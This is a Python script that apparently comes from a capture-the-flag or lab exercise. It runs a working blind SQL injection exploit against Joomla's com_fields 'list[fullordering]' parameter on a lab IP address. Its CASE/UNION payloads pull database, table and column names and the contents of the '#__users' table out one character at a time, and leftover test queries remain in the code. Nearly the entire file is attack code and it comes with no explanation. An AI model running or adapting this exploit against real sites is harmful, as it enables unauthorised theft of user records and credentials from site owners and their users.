import requests

def check(st):
    #print(st)
    r = requests.get(st, allow_redirects=False)
    if r.status_code == 303:
        return True
    else: 
        return False

def stringToConcat(stIn):
    stOut = "CONCAT("
    for i in range(len(stIn)):
        stOut += "CHAR({}),".format(ord(stIn[i]))
    stOut = stOut[:-1]
    stOut += ")"
    return stOut


def run():
    
    
    tableName = stringToConcat("#__users")

    for wordNumber in range(1652,0,-1):
        word = str(wordNumber) + ": "
        wordEnd = False
        for letterNumber in range(1,20):
            if wordEnd:
                continue
            found = False
            for char in range(31,128):
                if found:
                    continue


                #       #__users
                #       #__user_keys
                #query = "http://10.10.109.110/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)   

                query = "http://10.10.109.110/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (CHAR({})=SUBSTRING(database(),{},1)) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)".format(char, letterNumber)
                test = "(SELECT table_name FROM information_schema.tables LIMIT {}, 1)".format(wordNumber)

                
                
                

                

                test = "(SELECT column_name FROM information_schema.columns WHERE table_name={} LIMIT {}, 1)".format(tableName, wordNumber)

                test = "(SELECT name FROM {} LIMIT {}, 1)".format(tableName, wordNumber)

                test = "(SELECT column_name FROM information_schema.columns LIMIT {}, 1)".format(wordNumber)

                query = "http://10.10.109.110/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (CHAR({})=SUBSTRING(TEST,{},1)) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)".format(char, letterNumber).replace("TEST", test)

                if check(query):
                    found = True
                    word += chr(char)
            if not found:
                wordEnd = True
                if word == "":
                    quit()
                    
        print(word)
if __name__ == "__main__":
    run()
    


